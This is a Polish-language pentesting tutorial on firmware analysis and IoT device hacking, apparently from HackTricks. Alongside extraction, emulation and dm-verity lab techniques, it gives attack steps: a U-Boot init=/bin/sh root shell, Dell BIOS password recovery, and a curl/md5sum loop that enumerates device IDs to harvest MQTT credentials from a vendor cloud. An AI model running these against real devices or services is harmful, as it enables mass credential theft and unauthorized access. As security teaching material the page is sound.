# Analiza firmware’u

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Wprowadzenie**

### Powiązane zasoby

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware to niezbędne oprogramowanie, które umożliwia prawidłowe działanie urządzeń, zarządzając komunikacją między komponentami sprzętowymi a oprogramowaniem, z którym użytkownicy wchodzą w interakcję. Jest przechowywany w pamięci trwałej, dzięki czemu urządzenie może korzystać z istotnych instrukcji od chwili włączenia, co prowadzi do uruchomienia systemu operacyjnego. Analiza firmware’u i jego potencjalna modyfikacja to kluczowy etap identyfikowania luk w zabezpieczeniach.<sup>[[2]](#references)[[3]](#references)</sup>

## **Zbieranie informacji**

**Zbieranie informacji** to kluczowy pierwszy krok w poznaniu budowy urządzenia i wykorzystywanych przez nie technologii. Proces ten obejmuje gromadzenie danych o:

- Architekturze CPU i uruchamianym systemie operacyjnym
- Szczegółach dotyczących bootloadera
- Układzie sprzętowym i dokumentacji technicznej
- Metrykach bazy kodu i lokalizacjach źródeł
- Bibliotekach zewnętrznych i typach licencji
- Historii aktualizacji i certyfikatach zgodności z przepisami
- Diagramach architektury i przepływu
- Ocenach bezpieczeństwa i zidentyfikowanych lukach

W tym celu nieocenione są narzędzia **open-source intelligence (OSINT)**, podobnie jak analiza wszelkich dostępnych komponentów oprogramowania open source z użyciem ręcznych i automatycznych metod weryfikacji. Narzędzia takie jak [Coverity Scan](https://scan.coverity.com) i [LGTM firmy Semmle](https://lgtm.com/#explore) oferują bezpłatną analizę statyczną, którą można wykorzystać do wykrywania potencjalnych problemów.

## **Pozyskiwanie firmware’u**

Firmware można pozyskać na różne sposoby, z których każdy wiąże się z innym poziomem złożoności:

- **Bezpośrednio** ze źródła (od deweloperów lub producentów)
- **Budując** go zgodnie z dostarczonymi instrukcjami
- **Pobierając** z oficjalnych stron pomocy technicznej
- Używając zapytań **Google dork** do wyszukiwania udostępnionych plików firmware’u
- Uzyskując bezpośredni dostęp do **cloud storage**, na przykład za pomocą narzędzi takich jak [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Przechwytując **aktualizacje** za pomocą technik man-in-the-middle
- **Wyodrębniając** firmware z urządzenia przez połączenia takie jak **UART**, **JTAG** lub **PICit**
- **Nasłuchując** żądań aktualizacji w komunikacji urządzenia
- Identyfikując i wykorzystując **zakodowane na stałe endpointy aktualizacji**
- **Zrzucając** firmware z bootloadera lub sieci
- **Wyjmując i odczytując** układ pamięci za pomocą odpowiednich narzędzi sprzętowych, gdy zawiodą wszystkie inne metody

### Logi dostępne tylko przez UART: wymuszenie powłoki root za pomocą środowiska U-Boot w pamięci flash

Jeśli dane wejściowe UART są ignorowane (dostępne są tylko logi), nadal można wymusić uruchomienie powłoki init, **edytując offline blob środowiska U-Boot**:<sup>[[6]](#references)</sup>

1. Zrzuć zawartość pamięci SPI flash za pomocą klipsa SOIC-8 i programatora (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Zlokalizuj partycję env U-Boot, edytuj `bootargs`, dodając `init=/bin/sh`, i **ponownie oblicz CRC32 env U-Boot** dla blobu.
3. Zapisz ponownie tylko partycję env i uruchom ponownie urządzenie; na UART powinien pojawić się shell.

Jest to przydatne w urządzeniach wbudowanych, w których shell bootloadera jest wyłączony, ale partycję env można zapisywać za pomocą zewnętrznego dostępu do pamięci flash.

## Analiza firmware

Teraz, gdy **masz firmware**, musisz wyodrębnić z niego informacje, aby wiedzieć, jak z nim postępować. Możesz użyć do tego różnych narzędzi:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Jeśli za pomocą tych narzędzi niewiele znajdziesz, sprawdź **entropię** obrazu poleceniem `binwalk -E <bin>`. Niska entropia oznacza, że obraz prawdopodobnie nie jest zaszyfrowany. Wysoka entropia wskazuje, że jest on prawdopodobnie zaszyfrowany (lub skompresowany w jakiś sposób).

Ponadto możesz użyć tych narzędzi, aby wyodrębnić **pliki osadzone w firmware**:

{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Możesz też użyć [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)), aby sprawdzić plik.

### Różnicowa analiza pamięci flash i odzyskiwalne magazyny sekretów XOR

Gdy format przechowywania ustawienia firmware nie jest udokumentowany, najpierw wykonaj kilka odczytów tej samej pamięci flash, zmień **dokładnie jedno** ustawienie, ponownie zrzutuj zawartość całego układu i porównaj offsety. Powtarzanie eksperymentu z kontrolowanymi wartościami pozwala odróżnić zmiany dotyczące ustawienia od liczników i metadanych zapisu; zmiany pojawiające się pod nowymi offsetami zamiast w miejscu wskazują na magazyn typu append-only lub o strukturze logu. Zachowaj usunięte lub oznaczone jako usunięte wpisy, ponieważ ich bajty danych mogą nadal dać się odzyskać.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

After zlokalizowaniu regionu wyodrębnij moduły firmware’u za pomocą narzędzi takich jak `binwalk` i przeanalizuj wstecznie funkcję zapisującą/walidującą w Ghidra. Potwierdź w kodzie granice pól, padding, indeksowanie klucza i jego wyprowadzanie, zamiast wnioskować o schemacie wyłącznie na podstawie wzorców ciphertextu.<sup>[[12]](#references)</sup>

#### Odzyskiwanie kluczy z zaszyfrowanego zerowego paddingu

Jak opisano w [szyfrowaniu opartym na XOR](../../crypto/symmetric/#xor-based-encryption), znany plaintext ujawnia bajty keystreamu na tych samych offsetach. Pole o stałym rozmiarze jest szczególnie narażone, gdy jego zerowy padding obejmuje wszystkie indeksy powtarzającego się klucza XOR: zaszyfrowany padding ujawnia te bajty klucza bezpośrednio, ponieważ `0x00 XOR key_byte = key_byte`. Jeśli pokryty jest każdy indeks klucza, odtwórz klucz na podstawie końcówki ciphertextu i odszyfruj wypełnione bajty.<sup>[[12]](#references)</sup>

Podatny format hasła BIOS-u DVAR firmy Dell jest konkretnym przykładem: bajt `0` pola o długości 32 bajtów jest przechowywany w postaci jawnej, a bajty `1..31` są szyfrowane powtarzającym się kluczem o długości 20 bajtów.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Dla hasła o długości `L` pozycje `L..31` miały wartość zero przed operacją XOR. Gdy `L <= 12`, te pozycje obejmują każdy indeks klucza, więc pełny klucz i hasło można odzyskać bez brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Odzyskiwanie kluczy z historycznych rekordów

Nie analizuj każdego rekordu niezależnie. Klucz DVAR jest wyprowadzany w przybliżeniu jako `modified_md5(device_seed || variable_GUID || password[0])`: seed urządzenia i GUID są stałe, a jedynym wejściem zależnym od hasła jest jego pierwszy bajt w postaci jawnej. Daje to maksymalnie 256 kluczy na urządzenie, a rekordy zaczynające się od tego samego bajtu współdzielą klucz. Grupuj aktywne i usunięte rekordy według tego bajtu; krótki historyczny rekord może ujawnić cały klucz przez dopełnienie i umożliwić odszyfrowanie bieżącego, dłuższego rekordu, którego własne dopełnienie nie wystarcza. Rotacja hasła może więc zwiększyć ekspozycję, gdy stare szyfrogramy są oznaczane jako usunięte, zamiast być wymazywane.<sup>[[12]](#references)</sup>

Narzędzie [`dellpwn`](https://github.com/R3n5k1/dellpwn) lokalizuje DVAR, weryfikuje kandydackie rekordy, odzyskuje hasła i może wyświetlać surowe zapisane bajty oraz bajty klucza. Skompiluj je z lokalnego checkoutu i przeskanuj zweryfikowany obraz flash w następujący sposób:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

W przypadku niestandardowych parserów odrzucaj fałszywe trafienia, sprawdzając strukturę rekordów, ograniczenia dotyczące znaków drukowalnych, dopełnienie zerami, entropię klucza i spójność w miejscu, w którym klucz zawija się do początku. Jeśli powtarzane zrzuty wykazują nieliczne zmiany bitów przy każdym zapisie, wylicz zaobserwowane maski i uporządkuj możliwe korekty według tych ograniczeń, ale zgłaszaj niejednoznaczne znaki zamiast przedstawiać wynik heurystyczny jako dokładne odzyskanie danych.<sup>[[12]](#references)</sup>

Weryfikatory haseł powinny przechowywać solony, iterowany hash jednokierunkowy zamiast odwracalnego szyfrogramu, a magazyny zorganizowane w dzienniku powinny bezpiecznie usuwać zastąpione tajne dane.<sup>[[12]](#references)</sup>

### Uzyskiwanie systemu plików

Używając wcześniej omówionych narzędzi, takich jak `binwalk -ev <bin>`, powinno udać się **wyodrębnić system plików**.\
Binwalk zazwyczaj wyodrębnia go do **folderu nazwanego typem systemu plików**, którym najczęściej jest jeden z następujących: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ręczne wyodrębnianie systemu plików

Czasami binwalk **nie ma bajtów magicznych systemu plików w swoich sygnaturach**. W takich przypadkach użyj binwalk, aby **znaleźć przesunięcie systemu plików i wyciąć skompresowany system plików** z pliku binarnego, a następnie **ręcznie wyodrębnić** system plików zgodnie z jego typem, wykonując poniższe czynności.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Uruchom poniższe **polecenie dd**, aby wyodrębnić system plików Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatywnie można też uruchomić następujące polecenie.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- W przypadku squashfs (użytego w powyższym przykładzie)

`$ unsquashfs dir.squashfs`

Pliki znajdą się później w katalogu "`squashfs-root`".

- Pliki archiwum CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- W przypadku systemów plików jffs2

`$ jefferson rootfsfile.jffs2`

- W przypadku systemów plików ubifs z pamięcią flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Odtwarzanie podzielonych głównych systemów plików w urządzeniach wbudowanych

Jeśli surowy zrzut eMMC/SSD zawiera prawidłowy nagłówek systemu plików, ale przesunięcia metadanych wykraczają poza nominalną partycję, nie uznawaj go od razu za uszkodzony. Kod rozruchowy urządzenia wbudowanego może złożyć rzeczywiste urządzenie główne z wielu fizycznych zakresów za pomocą Device Mapper, więc carving pojedynczej partycji GPT daje tylko pierwszy segment.<sup>[[9]](#references)</sup>

#### Wstępna analiza pełnego obrazu nośnika

Najpierw sprawdź, czy pozyskiwanie danych zostało zakończone, rozmiar obrazu jest stabilny i żaden proces nie zapisuje już do obrazu. Jeśli nazwa pliku zawiera adres początkowy/końcowy, porównaj ten zakres z rzeczywistą liczbą bajtów. Odtwórz GPT w trybie tylko do odczytu i dołącz wyłącznie wymagany zakres; **nie** uruchamiaj `vgchange -ay` na niezaufanym woluminie fizycznym na stacji roboczej, ponieważ może to spowodować kolizje grup woluminów i niezamierzone zapisy.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Wybierz jednorazową maszynę wirtualną, gdy oryginalna logika init lub stos LVM musi mieć dostęp do całego obrazu. Historyczne logi rozruchu ze standardowej partycji rozruchowej są szczególnie przydatne: bootloader mógł zapisać offsety w zastrzeżonym kontenerze, długości komponentów, wybór slotu, reguły wyrównania i weryfikację podpisu. Użyj tych wartości, aby wyodrębnić osadzoną linię poleceń, kernel i initramfs, a następnie niezależnie zweryfikuj każdy wynik za pomocą `file`, bajtów sygnatury i `binwalk`; odczyt do końca kontenera może przypadkowo dołączyć do kernela initrd, obiekt ACPI lub podpis.<sup>[[9]](#references)</sup>

#### Odtwórz mapę bloków używaną podczas rozruchu

Wyodrębnij initramfs kernela i poddaj inżynierii wstecznej jego `/init` oraz wszystkie biblioteki pamięci masowej. W [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) wyszukaj odwołania do ciągów `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i ścieżek partycji; następnie prześledź kod, który wybiera aktywny slot A/B i tworzy tabelę. Przydatne punkty startowe w radare2 to `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cel linear mapuje kolejne zakresy urządzenia wirtualnego na zakresy jednego lub większej liczby urządzeń bazowych. Odzyskana tabela z dwoma segmentami często ma następującą postać (wszystkie pozycje i długości podano w sektorach po 512 bajtów):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Odtwórz dokładnie arytmetykę kodu maszynowego, w tym szerokość liczb całkowitych, przesunięcia bitowe i konwersje jednostek. Na przykład poniższe wyrażenie zaokrągla rozmiar w bajtach w dół do granicy 4 KiB, a dopiero potem przelicza go na sektory po 512 bajtów; zastąpienie go przez `p4_bytes // 512` przesuwa wybrany zakres końcowy o `p4_bytes % 4096`, gdy partycja nie jest wyrównana do granicy strony.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Odtwórz płaski obraz analityczny, kopiując zakresy w kolejności z tabeli, porcjami o ograniczonym rozmiarze, zamiast wczytywać cały zrzut nośnika do pamięci. Pozwala to również uniknąć tworzenia urządzeń mapujących po stronie hosta. Zachowaj przesunięcia wyznaczone na podstawie GPT, odwrócone liczby sektorów i wynikową długość pliku wyjściowego jako osobne asercje.<sup>[[9]](#references)</sup>

#### Odróżnianie uszkodzenia od stałego błędu rekonstrukcji

W przypadku SquashFS sprawdź sygnaturę `hsqs` i odczytaj 64-bitowe pole `bytes_used` w little-endian z przesunięcia 40 w superbloku, zanim uruchomisz `unsquashfs`. Jeśli ekstrakcja nie powiedzie się w kilku niezwiązanych strukturach, przeszukaj szerokie okno wokół oczekiwanych pozycji i wymagaj silnych kandydatów strukturalnych: dekompresowalnego bloku metadanych, kilku kolejnych prawidłowych wpisów katalogowych, wiarygodnych pól inode, inode katalogu głównego zgodnego z liczbą inode’ów lub prawidłowej struktury metadanych integralności. Pojedyncze dopasowanie sygnatury nie wystarczy.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Gdy ta sama podpisana delta sprawia, że niezależne struktury stają się prawidłowe — na przykład metadane katalogu i rekord verity — prawdopodobną przyczyną jest systematyczny błąd początku segmentu, a nie brakujące bajty. Wróć do odwróconych obliczeń i sprawdź, czy nie pominięto reszt, nie wystąpił problem z interpretacją znaku, przepełnienie ani zaokrąglanie do granicy sektora lub strony, zanim spróbujesz odzyskiwać osierocone dane lub modyfikować metadane systemu plików.<sup>[[9]](#references)</sup>

Na koniec nie mieszaj granic ochrony: woluminy LUKS z kluczem zapieczętowanym w TPM chronią poufność danych, a podpisane mapowanie dm-verity chroni integralność głównego systemu plików. Programowy TPM nie odzyska klucza zapieczętowanego w oryginalnym fizycznym TPM, a uruchomienie zmodyfikowanego SquashFS przez init przeznaczony wyłącznie do badań, który pomija weryfikację verity, nie fałszuje jego podpisu ani nie łamie dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmware

Po uzyskaniu firmware należy go dokładnie przeanalizować, aby zrozumieć jego strukturę i potencjalne podatności. Proces ten polega na użyciu różnych narzędzi do analizy i wyodrębniania cennych danych z obrazu firmware.

### Narzędzia do wstępnej analizy

Poniżej przedstawiono zestaw poleceń do wstępnej inspekcji pliku binarnego (oznaczonego jako `<bin>`). Polecenia te pomagają określić typy plików, wyodrębnić ciągi znaków, analizować dane binarne oraz poznać szczegóły partycji i systemu plików:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Aby ocenić stan szyfrowania obrazu, sprawdza się **entropię** za pomocą `binwalk -E <bin>`. Niska entropia sugeruje brak szyfrowania, natomiast wysoka może wskazywać na szyfrowanie lub kompresję.

Do wyodrębniania **osadzonych plików** zalecane są narzędzia i zasoby, takie jak dokumentacja **file-data-carving-recovery-tools** oraz **binvis.io** do inspekcji plików.

### Wyodrębnianie systemu plików

Za pomocą `binwalk -ev <bin>` można zwykle wyodrębnić system plików, często do katalogu o nazwie odpowiadającej typowi systemu plików (np. squashfs, ubifs). Jeśli jednak **binwalk** nie rozpoznaje typu systemu plików z powodu braku magic bytes, konieczne jest ręczne wyodrębnienie. Polega ono na użyciu `binwalk` do ustalenia przesunięcia systemu plików, a następnie polecenia `dd` do wyodrębnienia systemu plików:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Następnie, w zależności od typu systemu plików (np. squashfs, cpio, jffs2, ubifs), do ręcznego wyodrębnienia zawartości używa się różnych poleceń.

### Analiza systemu plików

Po wyodrębnieniu systemu plików rozpoczyna się poszukiwanie luk w zabezpieczeniach. Zwraca się uwagę na niezabezpieczone demony sieciowe, zakodowane na stałe dane uwierzytelniające, punkty końcowe API, funkcje serwera aktualizacji, nieskompilowany kod, skrypty startowe oraz skompilowane pliki binarne do analizy offline.

**Kluczowe lokalizacje** i **elementy** do sprawdzenia:

- **etc/shadow** i **etc/passwd** — dane uwierzytelniające użytkowników
- Certyfikaty i klucze SSL w **etc/ssl**
- Pliki konfiguracyjne i skrypty pod kątem potencjalnych luk
- Wbudowane pliki binarne do dalszej analizy
- Typowe serwery WWW i pliki binarne urządzeń IoT

Kilka narzędzi pomaga wykrywać poufne informacje i luki w systemie plików:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) do wyszukiwania poufnych informacji
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) do kompleksowej analizy firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) do analizy statycznej i dynamicznej

### Kontrole zabezpieczeń skompilowanych plików binarnych

Zarówno kod źródłowy, jak i skompilowane pliki binarne znalezione w systemie plików należy dokładnie sprawdzić pod kątem luk. Narzędzia takie jak **checksec.sh** dla plików binarnych Unix i **PESecurity** dla plików binarnych Windows pomagają wykrywać niezabezpieczone pliki binarne, które można wykorzystać.

## Pozyskiwanie konfiguracji chmurowej i danych uwierzytelniających MQTT za pomocą tokenów URL wyprowadzonych z identyfikatora

Wiele hubów IoT pobiera konfigurację dla danego urządzenia z punktu końcowego w chmurze o postaci:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Podczas analizy firmware możesz odkryć, że wartość `<token>` jest lokalnie wyprowadzana z identyfikatora urządzenia przy użyciu zakodowanego na stałe sekretu, na przykład:

- token = MD5( deviceId || STATIC_KEY ) i zapisany jako wielkie litery szesnastkowe

Taka konstrukcja umożliwia każdemu, kto pozna deviceId i STATIC_KEY, odtworzenie URL-a i pobranie konfiguracji chmurowej, w której często znajdują się jawne dane uwierzytelniające MQTT oraz prefiksy tematów.

Praktyczny przebieg pracy:

1) Wyodrębnij deviceId z logów startowych UART

- Podłącz adapter UART 3.3 V (TX/RX/GND) i przechwyć logi:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Poszukaj linii wypisujących wzorzec URL konfiguracji chmury oraz adres brokera, na przykład:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Odzyskaj STATIC_KEY i algorytm tokena z firmware

- Załaduj pliki binarne do Ghidra/radare2 i wyszukaj ścieżkę konfiguracji ("/pf/") lub użycie MD5.
- Potwierdź algorytm (np. MD5(deviceId||STATIC_KEY)).
- Wyznacz token w Bashu i zamień skrót na wielkie litery:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Zbieranie konfiguracji chmury i danych uwierzytelniających MQTT

- Złóż URL i pobierz JSON za pomocą curl; przeanalizuj go przy użyciu jq, aby wyodrębnić sekrety:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Wykorzystaj MQTT przesyłające dane jawnym tekstem i słabe ACL-e tematów (jeśli występują)

- Użyj odzyskanych danych uwierzytelniających, aby subskrybować tematy konserwacyjne i wyszukać poufne zdarzenia:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Wylicz przewidywalne identyfikatory urządzeń (na dużą skalę, za zgodą)

- Wiele ekosystemów umieszcza bajty OUI/produktu/typu dostawcy, po których następuje sekwencyjny sufiks.
- Możesz iterować po potencjalnych identyfikatorach, wyprowadzać tokeny i programowo pobierać konfiguracje:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Uwagi
- Zawsze uzyskaj wyraźną zgodę przed podjęciem próby masowej enumeracji.
- Jeśli to możliwe, zamiast modyfikować docelowy sprzęt, wybieraj emulację lub analizę statyczną, aby odzyskać sekrety.


Proces emulacji firmware umożliwia **analizę dynamiczną** działania urządzenia lub pojedynczego programu. Podejście to może napotkać problemy związane z zależnościami od sprzętu lub architektury, ale przeniesienie głównego systemu plików lub konkretnych plików binarnych na urządzenie o zgodnej architekturze i endianowości, takie jak Raspberry Pi, albo do gotowej maszyny wirtualnej może ułatwić dalsze testowanie.

### Emulowanie pojedynczych plików binarnych

Podczas badania pojedynczych programów kluczowe jest ustalenie ich endianowości i architektury CPU.

#### Przykład z architekturą MIPS

Do emulacji pliku binarnego dla architektury MIPS można użyć polecenia:

```bash
file ./squashfs-root/bin/busybox
```

Oraz aby zainstalować niezbędne narzędzia emulacyjne:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Dla MIPS (big-endian) używa się `qemu-mips`, a w przypadku binariów little-endian — `qemu-mipsel`.

#### Emulacja architektury ARM

W przypadku binariów ARM proces jest podobny: do emulacji używa się emulatora `qemu-arm`.

### Pełna emulacja systemu

Narzędzia takie jak [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i inne ułatwiają pełną emulację firmware, automatyzując ten proces i wspierając analizę dynamiczną.

### Odtwarzanie podzielonych i weryfikowanych systemów plików root na potrzeby emulacji

Jeśli superblok SquashFS jest czytelny, ale przesunięcia tablic inode’ów, katalogów lub fragmentów są niemożliwe do ustalenia, nie modyfikuj od razu `unsquashfs`. Przeanalizuj wczesny plik binarny rozruchu i odtwórz tworzony przez niego graf urządzeń blokowych: systemy wbudowane mogą udostępniać nominalną partycję root, ale tworzyć rzeczywisty system plików za pomocą mapowania `dm-linear`, które dołącza sektory pobrane z innej partycji. Kontrole ograniczone do superbloku mogą przechodzić, nawet gdy wszystkie późniejsze bloki metadanych są przesunięte.<sup>[[11]](#references)</sup>

Dokładnie zachowaj sposób wykonywania obliczeń przez firmware. Ustal, czy długości są wyrażone w bajtach, sektorach 512-bajtowych czy stronach 4 KiB; odtwórz przesunięcia bitowe i obcinanie wartości w pierwotnej kolejności; uwzględnij też zależne od banku obszary końcowe w układach A/B. Na przykład `(partition_bytes >> 12) << 3` najpierw obcina wartość do granicy 4 KiB, a dopiero potem wyraża wynik w sektorach 512-bajtowych; zastąpienie tego wyrażenia przez `partition_bytes // 512` może przesunąć dołączony obszar o kilka kilobajtów i uszkodzić wszystkie dalsze tablice SquashFS.<sup>[[11]](#references)</sup>

Przydatny proces walidacji:<sup>[[11]](#references)</sup>

1. Ustal z binarnego pliku weryfikatora/init źródłowe urządzenie, sektor początkowy i długość każdego segmentu `dm-linear`.
2. Połącz lub zmapuj obszary, nie zmieniając zasad ich wyrównania.
3. Jeśli ekstrakcja nadal się nie powiedzie, przeszukaj tylko niewielki zakres wokół przewidywanej granicy i wymagaj kilku kolejnych prawidłowych struktur metadanych, zamiast uznawać za wystarczający sam wiarygodnie wyglądający superblok.
4. Uruchom niezmodyfikowany `unsquashfs` na odtworzonym obrazie; poprawne przejście przez wszystkie katalogi i fragmenty jest mocniejszym dowodem niż wynik `unsquashfs -stat`.

#### Zastąpienie dm-verity kontrolowane przez analityka

Gdy analityk kontroluje jądro QEMU, initramfs i dyski wirtualne, zmodyfikowany root można uruchomić, zastępując dostarczony przez producenta PID 1 weryfikujący system niewielkim, statycznie linkowanym init. To **podstawienie w łańcuchu rozruchowym w laboratorium**, a nie złamanie dm-verity, jego podpisu RSA, Secure Boot ani klucza powiązanego z TPM.<sup>[[11]](#references)</sup>

Zastępczy init powinien odtworzyć operacyjne elementy pierwotnego procesu rozruchu: zamontować `devtmpfs`, wywołać `setsid()`, podłączyć `/dev/console` do deskryptorów plików 0–2, zamontować `/proc` i `/sys`, poczekać na dostarczone urządzenie blokowe, zamontować zmodyfikowany system plików root tylko do odczytu, odłączyć pseudo-systemy plików starego root, przenieść nowe montowanie na `/`, wykonać `chroot` i uruchomić przez `execve()` oryginalny plik firmware `/sbin/init`. Odłączenie `/dev`, `/proc` i `/sys` **przed** `MS_MOVE` zapobiega przypadkowemu odłączeniu punktów montowania należących do nowego root.<sup>[[11]](#references)</sup>

Oddziel zmienny stan urządzenia od zmodyfikowanego, niezmiennego systemu plików root. Nakładka qcow2 może zachować stan LVM oryginalnego dysku, a drugi dysk virtio zamontowany tylko do odczytu może udostępniać zmodyfikowany SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugowanie stanu obrazu offline

Sprawdź trwały stan poza systemem gościa, gdy powolne uruchamianie, destrukcyjne skrypty startowe lub zawodne logowanie konsoli utrudniają ustalenie przyczyny awarii. Nigdy nie podłączaj overlayu używanego przez działającą maszynę wirtualną; udostępnij go za pomocą `qemu-nbd`, ogranicz wykrywanie LVM do przeznaczonej partycji NBD i dezaktywuj grupę woluminów przed odłączeniem.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

